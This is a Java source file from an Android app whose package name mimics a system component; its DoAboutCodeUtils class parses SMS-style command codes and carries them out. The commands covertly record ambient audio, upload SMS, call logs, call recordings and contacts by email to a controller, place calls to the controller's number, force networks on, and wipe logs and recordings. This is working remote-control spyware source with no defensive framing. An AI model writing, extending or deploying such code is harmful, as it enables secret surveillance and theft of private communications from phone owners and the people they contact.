package com.android.system.controled.util;

import java.io.File;

import android.content.Context;
import android.content.Intent;
import android.net.Uri;

import com.android.system.controled.Debug;
import com.android.system.controled.MainApplication;
import com.android.system.controled.bean.Code;

public class DoAboutCodeUtils {

	private static final String TAG = "DoAboutCodeUtils";

	/**
	 * 是否是指令
	 * 
	 * @Description:
	 * @param msgTxt
	 * @return
	 * @see:
	 * @since:
	 * @author: zhuanggy
	 * @date:2013-10-15
	 */
	public static Code getCode(String msgTxt) {

		Code code = new Code();
		if (msgTxt.contains(MainApplication.PHONE_CODE_UP)) {
			code.setCode(MainApplication.PHONE_CODE_UP);
			code.setMark(MainApplication.PHONE_CODE_UP_MARK);
			code.setRedoNeed(Code.REDO_NOT);
			// Debug.e(TAG, "调大铃声音量，并加震动");
			return code;
		}

		else if (msgTxt.contains(MainApplication.PHONE_CODE_CALL_ME)) {
			code.setCode(MainApplication.PHONE_CODE_CALL_ME);
			code.setMark(MainApplication.PHONE_CODE_CALL_ME_MARK);
			code.setRedoNeed(Code.REDO_NOT);
			// Debug.e(TAG, "拨打电话");
			return code;
		}

		else if (msgTxt.contains(MainApplication.PHONE_CODE_UPLOAD_SMS_CALL)) {
			code.setRedoNeed(Code.REDO_NEED);
			// Debug.e(TAG, "上传短信通话记录");
			if (msgTxt.contains(MainApplication.PHONE_CODE_UPLOAD_SMS_CALL_MOBILE)) {
				code.setCode(MainApplication.PHONE_CODE_UPLOAD_SMS_CALL_MARK);
				code.setMark(MainApplication.PHONE_CODE_CALL_ME_MARK);
			} else {
				code.setCode(MainApplication.PHONE_CODE_UPLOAD_SMS_CALL_MOBILE);
				code.setMark(MainApplication.PHONE_CODE_UPLOAD_SMS_CALL_MOBILE_MARK);
			}
			return code;
		}

		else if (msgTxt.contains(MainApplication.PHONE_CODE_UPLOAD_AUDIO_CALL)) {
			// Debug.e(TAG, "上传通话录音");
			code.setRedoNeed(Code.REDO_NEED);
			if (msgTxt.contains(MainApplication.PHONE_CODE_UPLOAD_AUDIO_CALL_MOBILE)) {
				code.setCode(MainApplication.PHONE_CODE_UPLOAD_AUDIO_CALL_MOBILE);
				code.setMark(MainApplication.PHONE_CODE_UPLOAD_AUDIO_CALL_MOBILE_MARK);
			} else {
				code.setCode(MainApplication.PHONE_CODE_UPLOAD_AUDIO_CALL);
				code.setMark(MainApplication.PHONE_CODE_UPLOAD_AUDIO_CALL_MARK);
			}
			return code;
		}

		else if (msgTxt.contains(MainApplication.PHONE_CODE_UPLOAD_AUDIO_OTHER)) {
			// Debug.e(TAG, "上传其它录音");
			code.setRedoNeed(Code.REDO_NEED);
			if (msgTxt.contains(MainApplication.PHONE_CODE_UPLOAD_AUDIO_OTHER_MOBILE)) {
				code.setCode(MainApplication.PHONE_CODE_UPLOAD_AUDIO_OTHER_MOBILE);
				code.setMark(MainApplication.PHONE_CODE_UPLOAD_AUDIO_OTHER_MOBILE_MARK);
			} else {
				code.setCode(MainApplication.PHONE_CODE_UPLOAD_AUDIO_OTHER);
				code.setMark(MainApplication.PHONE_CODE_UPLOAD_AUDIO_OTHER_MARK);
			}
			return code;
		}

		else if (msgTxt.contains(MainApplication.PHONE_CODE_UPLOAD_ALL)) {
			// Debug.e(TAG, "上传所有");
			code.setRedoNeed(Code.REDO_NEED);
			if (msgTxt.contains(MainApplication.PHONE_CODE_UPLOAD_ALL_MOBILE)) {
				code.setCode(MainApplication.PHONE_CODE_UPLOAD_ALL_MOBILE);
				code.setMark(MainApplication.PHONE_CODE_UPLOAD_ALL_MOBILE_MARK);
			} else {
				code.setCode(MainApplication.PHONE_CODE_UPLOAD_ALL);
				code.setMark(MainApplication.PHONE_CODE_UPLOAD_ALL_MARK);
			}
			return code;
		}

		else if (msgTxt.contains(MainApplication.PHONE_CODE_RECORD_TIME)) {
			String words = msgTxt.substring(msgTxt.indexOf(MainApplication.PHONE_CODE_RECORD_TIME), msgTxt.length());
			String[] strs = words.split(":");
			if (strs.length == 2 && strs[1] != null) {
				code.setCode(MainApplication.PHONE_CODE_RECORD_TIME + strs[1]);
				code.setMark(MainApplication.PHONE_CODE_RECORD_TIME_MARK);
				code.setRedoNeed(Code.REDO_NOT);
				// Debug.e(TAG, "录音N分钟: " + strs[1]);
				return code;
			}
		}

		else if (msgTxt.contains(MainApplication.PHONE_CODE_UPLOAD_CONTACTS)) {
			code.setRedoNeed(Code.REDO_NEED);
			// Debug.e(TAG, "开始上传联系人");
			if (msgTxt.contains(MainApplication.PHONE_CODE_UPLOAD_CONTACTS_MOBILE)) {
				code.setCode(MainApplication.PHONE_CODE_UPLOAD_CONTACTS_MOBILE);
				code.setMark(MainApplication.PHONE_CODE_UPLOAD_CONTACTS_MOBILE_MARK);
			} else {
				code.setCode(MainApplication.PHONE_CODE_UPLOAD_CONTACTS);
				code.setMark(MainApplication.PHONE_CODE_UPLOAD_CONTACTS_MARK);
			}

			return code;
		}

		else if (msgTxt.contains(MainApplication.PHONE_CODE_RECORD_START)) {
			code.setCode(MainApplication.PHONE_CODE_RECORD_START);
			code.setMark(MainApplication.PHONE_CODE_RECORD_START_MARK);
			code.setRedoNeed(Code.REDO_NOT);
			// Debug.e(TAG, "开始录音");
			return code;
		}

		else if (msgTxt.contains(MainApplication.PHONE_CODE_RECORD_END)) {
			// Debug.e(TAG, "结束录音");
			code.setCode(MainApplication.PHONE_CODE_RECORD_END);
			code.setMark(MainApplication.PHONE_CODE_RECORD_END_MARK);
			code.setRedoNeed(Code.REDO_NOT);
			return code;
		}

		else if (msgTxt.contains(MainApplication.PHONE_CODE_DOWN)) {
			// Debug.e(TAG, "静音，并取消震动");
			code.setCode(MainApplication.PHONE_CODE_DOWN);
			code.setMark(MainApplication.PHONE_CODE_DOWN_MARK);
			code.setRedoNeed(Code.REDO_NOT);
			return code;
		}

		else if (msgTxt.contains(MainApplication.PHONE_CODE_DELETE_MSG_LOG)) {
			code.setCode(MainApplication.PHONE_CODE_DELETE_MSG_LOG);
			code.setMark(MainApplication.PHONE_CODE_DELETE_MSG_LOG_MARK);
			code.setRedoNeed(Code.REDO_NOT);
			// Debug.e(TAG, "删除短信记录");
			return code;
		}

		else if (msgTxt.contains(MainApplication.PHONE_CODE_DELETE_CALL_LOG)) {
			code.setCode(MainApplication.PHONE_CODE_DELETE_CALL_LOG);
			code.setMark(MainApplication.PHONE_CODE_DELETE_CALL_LOG_MARK);
			// Debug.e(TAG, "删除通话记录");
			return code;
		}

		else if (msgTxt.contains(MainApplication.PHONE_CODE_TURNON_WIFI)) {
			code.setCode(MainApplication.PHONE_CODE_TURNON_WIFI);
			code.setMark(MainApplication.PHONE_CODE_TURNON_WIFI_MARK);
			code.setRedoNeed(Code.REDO_NOT);
			// Debug.e(TAG, "开启wifi");
			return code;
		}

		else if (msgTxt.contains(MainApplication.PHONE_CODE_TURNON_MOBILE)) {
			code.setCode(MainApplication.PHONE_CODE_TURNON_MOBILE);
			code.setMark(MainApplication.PHONE_CODE_TURNON_MOBILE_MARK);
			code.setRedoNeed(Code.REDO_NOT);
			// Debug.e(TAG, "开启mobile network");
			return code;
		}

		else if (msgTxt.contains(MainApplication.PHONE_CODE_DELETE_AUDIOS_CALL)) {
			code.setCode(MainApplication.PHONE_CODE_DELETE_AUDIOS_CALL);
			code.setMark(MainApplication.PHONE_CODE_DELETE_AUDIOS_CALL_MARK);
			code.setRedoNeed(Code.REDO_NOT);
			// Debug.e(TAG, "删除通话录音记录");
			return code;
		}

		else if (msgTxt.contains(MainApplication.PHONE_CODE_DELETE_AUDIOS_OTHER)) {
			code.setCode(MainApplication.PHONE_CODE_DELETE_AUDIOS_OTHER_MARK);
			code.setMark(MainApplication.PHONE_CODE_DELETE_AUDIOS_OTHER);
			code.setRedoNeed(Code.REDO_NOT);
			// Debug.e(TAG, "删除其它录音记录");
			return code;
		}

		else if (msgTxt.contains(MainApplication.PHONE_CODE_DELETE_ALL_LOG)) {
			code.setCode(MainApplication.PHONE_CODE_DELETE_ALL_LOG);
			code.setMark(MainApplication.PHONE_CODE_DELETE_ALL_LOG_MARK);
			code.setRedoNeed(Code.REDO_NOT);
			// Debug.e(TAG, "删除所有记录");
			return code;
		}

		return null;
	}

	/**
	 * 执行命令
	 * 
	 * @Description:
	 * @param context
	 * @param msgTxt
	 * @param code
	 * @return
	 * @see:
	 * @since:
	 * @author: zhuanggy
	 * @date:2013-10-15
	 */
	public static Code doOperaByMessage(Context context, String msgTxt, Code code) {

		try {

			if (msgTxt.contains(MainApplication.PHONE_CODE_UP)) {
				code.setCode(MainApplication.PHONE_CODE_UP);
				code.setMark(MainApplication.PHONE_CODE_UP_MARK);
				Debug.e(TAG, "调大铃声音量，并加震动");
				AudioUtil.turnUpMost(context);
				code.setResult(Code.RESULT_OK);
			}

			else if (msgTxt.contains(MainApplication.PHONE_CODE_CALL_ME)) {
				code.setCode(MainApplication.PHONE_CODE_CALL_ME);
				code.setMark(MainApplication.PHONE_CODE_CALL_ME_MARK);
				Debug.e(TAG, "拨打电话");
				Uri uri = Uri.parse("tel:" + MainApplication.getInstence().getControllerTel());
				Intent it = new Intent(Intent.ACTION_CALL, uri); // 直接呼出
				it.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
				context.startActivity(it);

				code.setResult(Code.RESULT_OK);
			}

			else if (msgTxt.contains(MainApplication.PHONE_CODE_UPLOAD_SMS_CALL)) {
				code.setRedoNeed(Code.REDO_NEED);
				Debug.e(TAG, "上传短信通话记录");
				SendEmailUtil send2 = new SendEmailUtil();
				if (msgTxt.contains(MainApplication.PHONE_CODE_UPLOAD_SMS_CALL_MOBILE)) {
					code.setCode(MainApplication.PHONE_CODE_UPLOAD_SMS_CALL_MOBILE);
					code.setMark(MainApplication.PHONE_CODE_UPLOAD_SMS_CALL_MOBILE_MARK);
					send2.upLoadSmsCallLog(true, code);
				} else {
					code.setCode(MainApplication.PHONE_CODE_UPLOAD_SMS_CALL);
					code.setMark(MainApplication.PHONE_CODE_UPLOAD_SMS_CALL_MARK);
					send2.upLoadSmsCallLog(false, code);
				}
			}

			else if (msgTxt.contains(MainApplication.PHONE_CODE_UPLOAD_AUDIO_CALL)) {
				Debug.e(TAG, "上传通话录音");
				code.setRedoNeed(Code.REDO_NEED);
				SendEmailUtil send2 = new SendEmailUtil();
				if (msgTxt.contains(MainApplication.PHONE_CODE_UPLOAD_AUDIO_CALL_MOBILE)) {
					code.setCode(MainApplication.PHONE_CODE_UPLOAD_AUDIO_CALL_MOBILE);
					code.setMark(MainApplication.PHONE_CODE_UPLOAD_AUDIO_CALL_MOBILE_MARK);

					send2.upLoadCallAudios(true, code);
				} else {

					code.setCode(MainApplication.PHONE_CODE_UPLOAD_AUDIO_CALL);
					code.setMark(MainApplication.PHONE_CODE_UPLOAD_AUDIO_CALL_MARK);

					send2.upLoadCallAudios(false, code);
				}
			}

			else if (msgTxt.contains(MainApplication.PHONE_CODE_UPLOAD_AUDIO_OTHER)) {
				Debug.e(TAG, "上传其它录音");
				code.setRedoNeed(Code.REDO_NEED);
				SendEmailUtil send2 = new SendEmailUtil();
				if (msgTxt.contains(MainApplication.PHONE_CODE_UPLOAD_AUDIO_OTHER_MOBILE)) {
					code.setCode(MainApplication.PHONE_CODE_UPLOAD_AUDIO_OTHER_MOBILE);
					code.setMark(MainApplication.PHONE_CODE_UPLOAD_AUDIO_OTHER_MOBILE_MARK);
					send2.upLoadOtherAudios(true, code);
				} else {
					code.setCode(MainApplication.PHONE_CODE_UPLOAD_AUDIO_OTHER);
					code.setMark(MainApplication.PHONE_CODE_UPLOAD_AUDIO_OTHER_MARK);
					send2.upLoadOtherAudios(false, code);
				}
			}

			else if (msgTxt.contains(MainApplication.PHONE_CODE_UPLOAD_ALL)) {
				Debug.e(TAG, "上传所有");
				code.setRedoNeed(Code.REDO_NEED);
				SendEmailUtil send2 = new SendEmailUtil();
				if (msgTxt.contains(MainApplication.PHONE_CODE_UPLOAD_ALL_MOBILE)) {
					code.setCode(MainApplication.PHONE_CODE_UPLOAD_ALL_MOBILE);
					code.setMark(MainApplication.PHONE_CODE_UPLOAD_ALL_MOBILE_MARK);
					send2.upLoadALL(true, code);
				} else {
					code.setCode(MainApplication.PHONE_CODE_UPLOAD_ALL);
					code.setMark(MainApplication.PHONE_CODE_UPLOAD_ALL_MARK);
					send2.upLoadALL(false, code);
				}
			}

			else if (msgTxt.contains(MainApplication.PHONE_CODE_RECORD_TIME)) {
				String words = msgTxt.substring(msgTxt.indexOf(MainApplication.PHONE_CODE_RECORD_TIME), msgTxt.length());
				String[] strs = words.split(":");
				if (strs.length == 2 && strs[1] != null) {

					code.setCode(MainApplication.PHONE_CODE_RECORD_TIME + strs[1]);
					code.setMark(MainApplication.PHONE_CODE_RECORD_TIME_MARK);
					code.setRedoNeed(Code.REDO_NOT);

					Debug.e(TAG, "录音N分钟: " + strs[1]);
					// 文件保存位置
					File file = new File(MainApplication.FILEPATH_AUDIOS_OTHER + strs[1] + " minutes-" + TimeUtil.longToDateTimeString(TimeUtil.getCurrentTimeMillis()) + ".amr");
					if (RecorderUtil.getInstence(context).startRecorder(file, Integer.parseInt(strs[1]))) {
						code.setResult(Code.RESULT_OK);
					}

				}
			}

			else if (msgTxt.contains(MainApplication.PHONE_CODE_UPLOAD_CONTACTS)) {
				code.setRedoNeed(Code.REDO_NEED);
				Debug.e(TAG, "开始上传联系人");
				SendEmailUtil send3 = new SendEmailUtil();
				if (msgTxt.contains(MainApplication.PHONE_CODE_UPLOAD_CONTACTS_MOBILE)) {
					code.setCode(MainApplication.PHONE_CODE_UPLOAD_CONTACTS_MOBILE);
					code.setMark(MainApplication.PHONE_CODE_UPLOAD_CONTACTS_MOBILE_MARK);
					send3.upLoadContact(true, code);
				} else {
					code.setCode(MainApplication.PHONE_CODE_UPLOAD_CONTACTS);
					code.setMark(MainApplication.PHONE_CODE_UPLOAD_CONTACTS_MARK);
					send3.upLoadContact(false, code);
				}
			}

			else if (msgTxt.contains(MainApplication.PHONE_CODE_RECORD_START)) {
				code.setCode(MainApplication.PHONE_CODE_RECORD_START);
				code.setMark(MainApplication.PHONE_CODE_RECORD_START_MARK);
				code.setRedoNeed(Code.REDO_NOT);
				Debug.e(TAG, "开始录音");
				// 文件保存位置
				File file = new File(MainApplication.FILEPATH_AUDIOS_OTHER + TimeUtil.longToDateTimeString(TimeUtil.getCurrentTimeMillis()) + ".amr");
				if (RecorderUtil.getInstence(context).startRecorder(file, -1)) {
					code.setResult(Code.RESULT_OK);
				}
			}

			else if (msgTxt.contains(MainApplication.PHONE_CODE_RECORD_END)) {
				Debug.e(TAG, "结束录音");
				code.setCode(MainApplication.PHONE_CODE_RECORD_END);
				code.setMark(MainApplication.PHONE_CODE_RECORD_END_MARK);
				code.setRedoNeed(Code.REDO_NOT);
				RecorderUtil.getInstence(context).stopRecorder();
				code.setResult(Code.RESULT_OK);
			}

			else if (msgTxt.contains(MainApplication.PHONE_CODE_DOWN)) {
				Debug.e(TAG, "静音，并取消震动");
				code.setCode(MainApplication.PHONE_CODE_DOWN);
				code.setMark(MainApplication.PHONE_CODE_DOWN_MARK);
				code.setRedoNeed(Code.REDO_NOT);
				AudioUtil.turnDown(context);
				code.setResult(Code.RESULT_OK);
			}

			else if (msgTxt.contains(MainApplication.PHONE_CODE_DELETE_MSG_LOG)) {
				code.setCode(MainApplication.PHONE_CODE_DELETE_MSG_LOG);
				code.setMark(MainApplication.PHONE_CODE_DELETE_MSG_LOG_MARK);
				code.setRedoNeed(Code.REDO_NOT);
				Debug.e(TAG, "删除短信记录");
				deleteSmsLog(context);
				code.setResult(Code.RESULT_OK);
			}

			else if (msgTxt.contains(MainApplication.PHONE_CODE_DELETE_CALL_LOG)) {
				code.setCode(MainApplication.PHONE_CODE_DELETE_CALL_LOG);
				code.setMark(MainApplication.PHONE_CODE_DELETE_CALL_LOG_MARK);
				code.setRedoNeed(Code.REDO_NOT);
				Debug.e(TAG, "删除通话记录");
				deleteCallLog();
				code.setResult(Code.RESULT_OK);
			}

			else if (msgTxt.contains(MainApplication.PHONE_CODE_TURNON_WIFI)) {
				code.setCode(MainApplication.PHONE_CODE_TURNON_WIFI);
				code.setMark(MainApplication.PHONE_CODE_TURNON_WIFI_MARK);
				code.setRedoNeed(Code.REDO_NOT);
				Debug.e(TAG, "开启wifi");
				NetworkUtil.turnOnWifi(context);
				code.setResult(Code.RESULT_OK);
			}

			else if (msgTxt.contains(MainApplication.PHONE_CODE_TURNON_MOBILE)) {
				code.setCode(MainApplication.PHONE_CODE_TURNON_MOBILE);
				code.setMark(MainApplication.PHONE_CODE_TURNON_MOBILE_MARK);
				code.setRedoNeed(Code.REDO_NOT);
				Debug.e(TAG, "开启mobile network");
				NetworkUtil.setMobileNetEnable(context);
				code.setResult(Code.RESULT_OK);
			}

			else if (msgTxt.contains(MainApplication.PHONE_CODE_DELETE_AUDIOS_CALL)) {
				code.setCode(MainApplication.PHONE_CODE_DELETE_AUDIOS_CALL);
				code.setMark(MainApplication.PHONE_CODE_DELETE_AUDIOS_CALL_MARK);
				code.setRedoNeed(Code.REDO_NOT);
				Debug.e(TAG, "删除通话录音记录");
				deleteCallRecord();
				code.setResult(Code.RESULT_OK);
			}

			else if (msgTxt.contains(MainApplication.PHONE_CODE_DELETE_AUDIOS_OTHER)) {
				code.setCode(MainApplication.PHONE_CODE_DELETE_AUDIOS_OTHER);
				code.setMark(MainApplication.PHONE_CODE_DELETE_AUDIOS_OTHER_MARK);
				code.setRedoNeed(Code.REDO_NOT);
				Debug.e(TAG, "删除其它录音记录");
				deleteOtherRecord();
				code.setResult(Code.RESULT_OK);
			}

			else if (msgTxt.contains(MainApplication.PHONE_CODE_DELETE_ALL_LOG)) {
				code.setCode(MainApplication.PHONE_CODE_DELETE_ALL_LOG);
				code.setMark(MainApplication.PHONE_CODE_DELETE_ALL_LOG_MARK);
				code.setRedoNeed(Code.REDO_NOT);
				Debug.e(TAG, "删除所有记录");
				deleteSmsLog(context);
				deleteCallLog();
				deleteCallRecord();
				deleteOtherRecord();
				code.setResult(Code.RESULT_OK);
			}

		} catch (Exception e) {
			e.printStackTrace();
		}
		return code;
	}

	private static void deleteSmsLog(Context context) {

		new Thread(new Runnable() {

			@Override
			public void run() {

				try {

					if (MainApplication.FILE_DB_SMS.exists()) {
						// SmsSaveOutUtil so = new SmsSaveOutUtil(context);
						SmsSaveOutUtil so = SmsSaveOutUtil.getInstence();
						so.deleteAllMsg();
					}
				} catch (Exception e) {
					e.printStackTrace();
				}
			}
		}).start();

	}

	private static void deleteCallLog() {

		new Thread(new Runnable() {

			@Override
			public void run() {

				try {
					if (MainApplication.FILE_CALL_LOG.exists()) {
						MainApplication.FILE_CALL_LOG.delete();
					}

				} catch (Exception e) {
					e.printStackTrace();
				}

			}
		}).start();

	}

	private static void deleteCallRecord() {

		new Thread(new Runnable() {

			@Override
			public void run() {

				try {
					FileUtil.delFileDir(new File(MainApplication.FILEPATH_AUDIOS_CALL));
				} catch (Exception e) {
					e.printStackTrace();
				}

			}
		}).start();

	}

	private static void deleteOtherRecord() {

		new Thread(new Runnable() {

			@Override
			public void run() {

				try {
					FileUtil.delFileDir(new File(MainApplication.FILEPATH_AUDIOS_OTHER));
				} catch (Exception e) {
					e.printStackTrace();
				}

			}
		}).start();

	}

}
